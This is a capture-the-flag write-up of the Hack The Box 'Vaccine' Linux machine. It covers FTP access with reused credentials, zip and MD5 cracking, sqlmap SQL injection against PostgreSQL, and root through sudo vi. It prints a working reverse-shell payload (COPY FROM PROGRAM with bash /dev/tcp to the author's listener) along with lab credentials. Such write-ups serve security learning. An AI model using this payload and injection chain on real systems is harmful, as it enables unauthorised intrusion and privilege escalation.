# Vaccine Box

This is a linux box CTF on hack the box. It runs a website with a db back end.

This box was quite annoying because HTB targets are shared, multiple people are trying to hack it at once. This leads to other users deleting databases and also removing anything that I did, such as trying to inject a reverse shell. So I had to try at a few different times, sometimes rushing to avoid having what I did undone by another user dropping tables or trying the same attack as I was. 

Tools I used are:

- Kali Linux
- SQLMAP
- Netcat
- NMap
- FTP

## Let's begin

I'll start off with an Nmap scan using sV and sC flags.

![ca9f4c71647696cf9e3bc697ecfe9606.png](images/c5d54a90b9274e16a81a8e9cc9eeba00.png)

Looks like we have few services open we can look into: FTP, SSH, HTTP

A quick search in searchsploit re the FTP server shows our only exploit is a DoS which is not helpful for the challenge.

![63db284efd7c00b19ece3f3895c20012.png](images/e5db358b77c44beb98a5f292fce1442d.png)

SSH accepts password login and public key.

![44221525defbc8a2e179558f5f7fe747.png](images/ff3a70b62a9b427489a09760a2ff48f9.png)

We have a MegaCorp login page on port 80.

![837c04721ca366d886de867b75aafb1e.png](images/99280b627a0743de952d12ed6de906ec.png)

Learning from the previous challenge, I'll try the admin credentials we got from Archetype that also worked in the Oopsie CTF, to see if it works on this challenge too. Not luck this time.

Next I'll try dirbuster and see if we can find any interesting folders or files.

![b18420e6906968e08f96a760ac4dc729.png](images/5ba49a0960484c3cb21c71c3c34f099d.png)

After not finding much interesting I hit the forum and it advised that there is a credential in the last challenge that helps with this challenge. I'll load up the Oopsie box again and go hunting.

Hunting around the Oopsie box let to a filezilla configuration file in the /root/.config folder

![22194124f2c948eeaec472464a94903c.png](images/bb6f55e293954765a1275f0d32b3f2a9.png)

here are the creds, we can see this is for IP 10.10.10.46, which is our current target.

ftpuser / mc@F1l3ZilL4

No we're in to the FTP folder with those credentials.

![c421fd7a486b9f2c481ec22bcf481ff6.png](images/bb99e78659a547cb9e17b44c0a92981a.png)

In that folder we can see one file called 'backup.zip'.

I'll grab it and see what's inside.

It looks like that file is password protected.

![28e445b9bb25fe533a19c8a4f44b0ffe.png](images/78d8bc1b1a3b45ceaaa9dbc546620645.png)

I'll try some of the passwords we have from this challenge and the previous challenges.

John was able to crack the password quite easily, I used this guide:

https://linuxconfig.org/how-to-crack-zip-password-on-kali-linux

![a25640398b5c1057dc6d423a90872428.png](images/0f237f8181b549baa3839ce02ceb0879.png)

![642cf763869db963845b356105dbfc44.png](images/bb1585013f5f4bfebc25a810d65a9539.png) ![9e7a169232f149989a71e7aa9317545d.png](images/d229b7253577480db9aab64f0b9915cc.png)

backup.zip:741852963

After unzipping the file the username and md5 password hash is accessible in the index.php file.

![2c7bfd0d5c9ef50e69fd8ac6ab6cccde.png](images/9f066a77e28b4798a490e62771aecafd.png)

MD5 Hash is: 2cb42f8734ea607eefed3b70af13bbd3

Decrypting the hash gives me the following:

admin / qwerty789

Now we're in the web portal.

![90dda03080be6d2a90f1086d1bbed086.png](images/57b5b030a5264191a4457498914b9d66.png)

Time to look around.

There is a search feature on the top right. There appears to be an injection option here as I received an error when trying a simple sql injection attack:

![c12852e8926a61ca0c4d5fdb943ab082.png](images/5803fe22235e404d8cb03fa511a476cd.png)

I'll try to use sqlmap to see if this can get me some info.

I'll use ZAP to capture the cookie data.

Looks like we have a PostgreSQL db, with possible injection here.

![9d35c642aa2bb38057901c4a6b06cf5b.png](images/286d179f414a4c1f98a63bf325bd87d8.png)

And we got some info

![3fdfd1f49c0eaa4e8f2253b670a7b033.png](images/2341edf52efc44a28ad0609dc39b9fb4.png)

I'll try for a shell.

Note while I was attempting this it appears that the data in the db 'dissappeared' I'm assuming another player dropped the DB. I will come back later, as it happened twice to me within a 30min period.

Coming back after another day, the data was restored to the host so I continued with my testing.

Using SQLMAP I managed to get the database names with 'dbs' flag

![ec3dd5c3a5428f69b68e8dd7680b763c.png](images/339b40ec511549c0b1fc4fe34f022860.png)

I then took a look at the tables in the public DB:

![bd82c049ecd9ff3fc0b5d754867d14a7.png](images/52366a7beb934eafb1c9c0e053c20b12.png)

Then I could obtain the data in that table with the --dump sqlmap flag.

![0c1c13af88dc0a61b6563356ecc75b3b.png](images/ff178f5c62ad41cd884920dd87c0b909.png)

I tried a reverse shell, but that did not seem to work with sqlmap.

Next I'll try get the user name and password ofr the db with the --user and --password flag in sqlmap

![004d2f7b21349506f6c32a642e20f986.png](images/a63a1e1597bc42b5a17e1a052b3efe81.png)

Now I will try to brute force the password with the rockyou.txt password list.

![df06301ea9e3e431f2f468b577d4cf54.png](images/7ba0deda95fe4bf9884edcb753c03747.png)

Unfortunately this did not work, the password must not be in that list.

Since I cannot get an os shell using the sqlmap builtin feature, I'll attempt to get a sql shell.

This worked.

![f7cb0557af2bc926380c22b958bbc5fa.png](images/a7eb7952811147a3a4e6b2304cae7146.png)

Now I will attempt to manually get a reverse shell, this article provides some instructions on performing and testing command injection.

https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5 

I ended up runing the following SQL Injection commands to get a reverse shell

DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd\_exec(cmd\_output text);

COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.109/4444 0>&1"';

This finally led to a remote shell

![8177cf227345ac1b490c788617b91c86.png](images/45f8bbf39b8445bb9ed95abdc3b21cc8.png)

Since the site is user a DB, I will look through the code to see if the DB password is available.

![f9d9214f120a9fc0bc764a328f303940.png](images/4bee4dbb99f342b6a6b566267ce32a80.png)

We can see the DB password and user in the dashboard.php file

![002b28a0a45c4474faa7ac50aac3e5c3.png](images/9031eae6d4454d3f99e684bc35ec26e3.png)

postgres P@s5w0rd!

Note at this point I got kicked off, another user must have dropped my table or reset the box. So I had to redo the above attack again to re-obtain a shell.

Now that I'm back in, I'll upgrade from a simple shell with python3 -c 'import pty; pty.spawn("/bin/sh")'

![1d6232cad372d13381beeadd0ac75b36.png](images/2aca0bc7ca804d18b98c4fa1b9d1e87a.png)

The user seems to have sudo access using vi, this can be easily exploited since vi can run shell commands. 

![0adc6e11777949fd58880ab1c8f6fc2a.png](images/aa3973eb03654d4dbd372e2339d3d5e7.png)

So I will run the above command as sudo, launching vi as root, then launch a shell with the following command in vi :!/bin/bash

Now I have root access

![67f14913f3bb116fa979c0fba90bbe2a.png](images/e91a82718b1743419908373c2d9ef202.png)

Finally for the flag:

![31a9d283550392adf57d52cfcee1d0e3.png](images/93960f37ca164b389c8c28c24c2bc6b2.png)